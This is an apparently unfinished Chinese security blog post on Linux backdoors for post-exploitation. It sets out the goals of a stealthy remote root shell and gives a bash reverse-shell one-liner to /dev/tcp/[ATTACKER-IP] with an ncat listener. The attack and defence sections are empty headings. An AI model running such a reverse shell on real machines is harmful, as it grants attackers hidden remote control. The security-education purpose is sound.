---
title: Linux 后门攻防实践
category: Sec
---

## Linux 后门攻防实践

### 0x00 前述

后门作为`post penetration`用于维持访问的主要手段，往往五花八门。从最简单的`shell`、`reverse shell`到`rootkit`，十分丰富。

后门有优劣之分。一般来说，我们希望后门尽可能多地具有以下几个功能（特点）：

- 提供一个远程攻击者能够随时使用的`root shell`
- 在靶机上能够具有良好的隐蔽性
- 与远程攻击者之间的通信具有良好的隐蔽性
- 提供的`root shell`具有访问控制功能（不能被其他攻击者使用）
- 安装过程不那么繁琐

当然，靶机环境的千差万别这一客观因素也导致后门的使用需要根据具体环境来安排。

我们对后门的安装时间点（或者说是渗透结束，准备做`post penetration`）做以下定义：

**攻击者使用一些渗透方式（如远程缓冲区溢出，本地提权等），已经获得靶机上的root权限（能够暂时性地与一个`root shell`交互）。**

本文将对一些后门从`攻`、`防`两个角度进行实践。对于一些简单的后门将说明其原理；对于一些复杂的后门，如较为高级的`rootkits`等，将另起文章进行说明。

### 0x01 shell&反弹shell

#### 0x010 关于

首先提一下`shell`和`反弹shell`。严格来说这两者本身并不具备维持访问的功能，仅仅提供一个shell。但是如果把它们和一些其他的工具结合，如`crontab`或`nohup`等，就能构成后门。这里的`shell`指的是靶机监听某端口，一旦有外部流量接入就分配一个shell；`反弹shell`则指攻击者的机器上监听某端口，靶机主动去连接这个端口并分配给攻击者一个shell。

`反弹shell`在以下两种环境中具有独特优势：

1. 靶机没有公网IP（或者说，没有能够直接被攻击者访问到的IP）
2. 靶机本身或所在网络的防火墙对出口流量不做限制或限制小

#### 0x011 shell

#### 0x012 反弹shell：bash

```bash
// Step1: Attacker
ncat -l -p 10000
// Step2: Victim
bash -i >& /dev/tcp/[ATTACKER-IP]/10000 0>&
```

截图如下：

![]({{ site.url }}/images/linux-backdoor/bash-reverse-0.png)

![]({{ site.url }}/images/linux-backdoor/bash-reverse-1.png)

注意上面的靶机只有一个内网地址`192.168.246.xxx`。

### 0x02 后门攻击实践

### 0x03 后门防御实践

### 0x04 参考

- [Linux下的icmp shell后门](http://vinc.top/2016/06/06/linux%E4%B8%8B%E7%9A%84icmp-shell%E5%90%8E%E9%97%A8/)
- [Linux后门](http://rcoil.me/2017/04/Linux%E5%B0%8F%E5%90%8E%E9%97%A8/)
- [Linux后门技术研究之ping后门](http://www.weixianmanbu.com/article/186.html)
- [linux后门N种姿势](http://www.vipread.com/library/item/594)
- [Linux后门整理合集（脉搏推荐）](https://www.secpulse.com/archives/59674.html)
- [Linux渗透之OpenSSH后门](http://zjw.dropsec.xyz/%E6%B8%97%E9%80%8F/%E6%B5%8B%E8%AF%95/2017/09/26/Linux%E6%B8%97%E9%80%8F%E4%B9%8BOpenSSH%E5%90%8E%E9%97%A8.html)
- [Linux软连接ssh后门之我见](http://blackwolfsec.cc/2017/03/24/Linux_ssh_backdoor/)
- [linux下反弹shell的几种方法](http://blog.csdn.net/u012985855/article/details/64117187?utm_source=itdadao&utm_medium=referral)
- [Linux下反弹shell笔记](https://www.cnblogs.com/deen-/p/7237327.html)